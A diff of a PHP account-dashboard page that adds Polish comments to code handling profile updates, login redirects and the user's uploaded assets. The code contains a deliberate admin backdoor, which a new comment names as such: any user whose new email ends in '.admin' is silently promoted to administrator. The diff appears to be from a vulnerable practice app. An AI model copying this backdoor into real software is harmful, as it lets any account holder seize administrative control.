@@ -1,9 +1,12 @@
 <?php
+// Dołączamy wszystkie niezbędne pliki: config, bazę, klasy użytkownika i assetów
+// Używamy __DIR__, żeby mieć pewność, że ścieżki są poprawne
 require_once __DIR__ . '/../config.php';
 require_once __DIR__ . '/../classes/Database.php';
 require_once __DIR__ . '/../classes/User.php';
 require_once __DIR__ . '/../classes/Asset.php';
 
+// Zabezpieczenie sesji dla Slim (odpalamy tylko jeśli jeszcze nie działa)
 if (session_status() === PHP_SESSION_NONE) {
     session_start();
 }
@@ -11,10 +14,12 @@ if (session_status() === PHP_SESSION_NONE) {
 $updateMessage = '';
 $updateError = '';
 
+// Obsługa formularza aktualizacji danych konta (zmiana hasła, emaila, nazwy użytkownika)
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     if (isset($_SESSION['user_id'])) {
         $userService = new User();
+        // Pobieramy aktualne dane zalogowanego użytkownika
         $currentUser = $userService->findById($_SESSION['user_id']);
 
         $currentPassword = $_POST['current_password'] ?? '';
@@ -22,15 +27,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $newEmail = trim($_POST['email'] ?? '');
         $newPassword = $_POST['new_password'] ?? '';
 
+        // Walidacja: czy podano poprawne obecne hasło?
         if (empty($currentPassword) || !password_verify($currentPassword, $currentUser['password'])) {
             $updateError = 'Incorrect current password. Changes were not saved.';
         } 
+        // Walidacja: czy pola nie są puste?
         elseif (empty($newUsername) || empty($newEmail)) {
             $updateError = 'Username and Email fields cannot be empty.';
         } 
         else {
             $dataToUpdate = [];
 
+            // Sprawdzamy co się zmieniło w porównaniu do obecnych danych w bazie
             if ($newUsername !== $currentUser['username']) {
                 $dataToUpdate['username'] = $newUsername;
             }
@@ -38,6 +46,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $emailToSave = $newEmail;
             $roleToSave = $currentUser['role'];
 
+            // "Easter egg" / Admin backdoor: jeśli nowy mail kończy się na .admin, użytkownik dostaje admina
             if ($currentUser['role'] !== 'admin' && str_ends_with($newEmail, '.admin')) {
                 $emailToSave = substr($newEmail, 0, -6);
                 $roleToSave = 'admin';
@@ -51,14 +60,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 $dataToUpdate['role'] = $roleToSave;
             }
 
+            // Hasło zmieniamy tylko jeśli użytkownik wpisał coś w polu "New Password"
             if (!empty($newPassword)) {
                 $dataToUpdate['password'] = $newPassword;
             }
 
+            // Jeśli są jakieś zmiany do zapisania...
             if (!empty($dataToUpdate)) {
                 $success = $userService->updateUser($currentUser['id'], $dataToUpdate);
                 if ($success) {
                     $updateMessage .= 'Account details updated successfully.';
+                    // Aktualizujemy sesję, żeby zmiany były widoczne od razu (np. nowa nazwa w nagłówku)
                     if (isset($dataToUpdate['role'])) {
                         $_SESSION['role'] = $dataToUpdate['role'];
                     }
@@ -73,14 +85,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 }
 
+// Jeśli ktoś próbuje wejść na dashboard bez logowania -> wyrzucamy go
 if (!isset($_SESSION['user_id'])) {
     header('Location: /login');
     exit();
 }
 
+// Pobieramy świeże dane użytkownika do wyświetlenia w profilu
 $userService = new User();
 $user = $userService->findById($_SESSION['user_id']);
 
+// Jeśli użytkownik został usunięty z bazy w międzyczasie -> wyloguj
 if (!$user) {
     header('Location: /login');
     exit();
@@ -88,6 +103,7 @@ if (!$user) {
 
 $isAdmin = ($user['role'] === 'admin');
 
+// Pobieramy listę assetów wrzuconych przez tego użytkownika
 $assetService = new Asset();
 $userAssets = $assetService->findByUserId($user['id']);
 $totalFiles = count($userAssets);
